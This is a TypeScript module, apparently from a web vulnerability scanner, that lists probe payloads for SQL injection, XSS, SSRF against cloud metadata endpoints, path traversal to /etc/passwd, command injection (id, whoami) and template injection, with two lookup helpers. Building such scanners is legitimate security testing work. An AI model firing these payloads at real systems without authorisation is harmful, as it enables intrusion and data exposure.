export interface PayloadCategory {
  type: string;
  description: string;
  payloads: string[];
}

export const SECURITY_PAYLOADS: Record<string, PayloadCategory> = {
  sqli: {
    type: "sqli",
    description: "SQL injection detection and blind boolean probes",
    payloads: [
      "' OR '1'='1",
      "' OR 1=1 --",
      "admin' --",
      "' UNION SELECT NULL, NULL, NULL --",
      "1' AND SLEEP(5) --",
      "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) --",
      "1 AND 1=1",
      "1 AND 1=2"
    ]
  },
  xss: {
    type: "xss",
    description: "Cross-site scripting reflection and polyglot vectors",
    payloads: [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "\" onfocus=alert(1) autofocus=\"",
      "'><svg/onload=alert(1)>",
      "javascript:alert(1)",
      "<iframe src=\"javascript:alert(1)\">",
      "{{constructor.constructor('alert(1)')()}}"
    ]
  },
  ssrf: {
    type: "ssrf",
    description: "Server-side request forgery probe targets and metadata URLs",
    payloads: [
      "http://127.0.0.1:80",
      "http://localhost:8080",
      "http://169.254.169.254/latest/meta-data/",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://[::1]:80/",
      "http://127.127.127.127",
      "http://0.0.0.0/"
    ]
  },
  traversal: {
    type: "traversal",
    description: "Directory traversal and arbitrary file retrieval vectors",
    payloads: [
      "../../../../etc/passwd",
      "..\\..\\..\\..\\windows\\win.ini",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "/etc/passwd%00.png",
      "file:///etc/passwd"
    ]
  },
  cmd: {
    type: "cmd",
    description: "Command injection separators and exfiltration primitives",
    payloads: [
      "; id",
      "| id",
      "&& whoami",
      "`id`",
      "$(whoami)",
      "; ping -c 1 127.0.0.1",
      "& dir"
    ]
  },
  ssti: {
    type: "ssti",
    description: "Server-side template injection arithmetic reflection probes",
    payloads: [
      "{{7*7}}",
      "${7*7}",
      "<%= 7*7 %>",
      "#{7*7}",
      "*{7*7}",
      "{{config.items()}}"
    ]
  }
};

export function getPayloadsForType(type: string): string[] {
  const norm = type.toLowerCase().trim();
  const cat = SECURITY_PAYLOADS[norm];
  return cat ? cat.payloads : [];
}

export function getAllPayloadTypes(): string[] {
  return Object.keys(SECURITY_PAYLOADS);
}
